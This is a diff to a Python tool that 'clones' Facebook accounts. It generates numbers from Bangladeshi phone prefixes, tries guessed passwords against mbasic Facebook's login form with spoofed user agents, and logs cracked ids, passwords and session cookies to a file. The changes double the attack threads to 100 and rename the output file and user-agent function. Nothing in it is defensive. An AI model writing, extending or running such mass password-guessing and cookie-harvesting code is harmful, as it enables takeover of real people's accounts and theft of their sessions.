@@ -803,7 +803,7 @@ def ran():
     elif ask in ["2", "02", "b", "B"]:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Type A BD 11 Digit Number  [orange3]▶  [chartreuse1]0171, 0185, 0192 etc")
+        print("[b]     [red1]✗ [chartreuse1]Type A BD 4 Digit Number  [orange3]▶  [chartreuse1]0171, 0185, 0192 etc")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
@@ -860,7 +860,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=50) as heron:
+    with ThreadPool(max_workers=100) as heron:
         
         sort.clear()
         sort.logo()
@@ -898,7 +898,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = uaxxxx()
+            uax = Vivo()
             
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
@@ -943,7 +943,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                 try:
                     if "height" in res["data"]:
                         print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[🍪][spring_green1]{coki}")
-                        open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
+                        open("/sdcard/SDid-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
                         oks.append(xd)
                         break
                 except KeyError as e:
